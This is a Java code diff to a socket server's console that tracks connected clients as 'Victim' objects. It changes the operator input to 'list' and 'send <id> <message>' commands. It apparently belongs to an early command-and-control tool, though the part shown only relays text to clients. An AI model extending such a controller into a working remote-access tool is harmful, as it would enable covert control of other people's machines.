@@ -5,6 +5,7 @@ import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Scanner;
 
@@ -28,18 +29,14 @@ public class Main {
 
         while (true) {
             System.out.print("--> ");
-            int input = scanner.nextInt();
-            scanner.nextLine(); // consume the newline character
-
-            if (input == 100) {
+            String input = scanner.nextLine();
+            String[] command = input.split(" ");
+            if (command[0].equals("list")) {
                 for (Victim victim : victims) {
                     System.out.println(victim.getId());
                 }
-            } else if (input >= 0 && input < victims.size()) {
-                System.out.println("sent msg");
-                victims.get(input).sendMessage("Message from server");
-            } else {
-                System.out.println("Invalid input. Please enter a valid victim index or 100 to list all.");
+            } else if (command[0].equals("send")) {
+                victims.get(Integer.parseInt(command[1])).sendMessage(String.join(" ", Arrays.copyOfRange(command, 2, command.length)));
             }
         }
     }
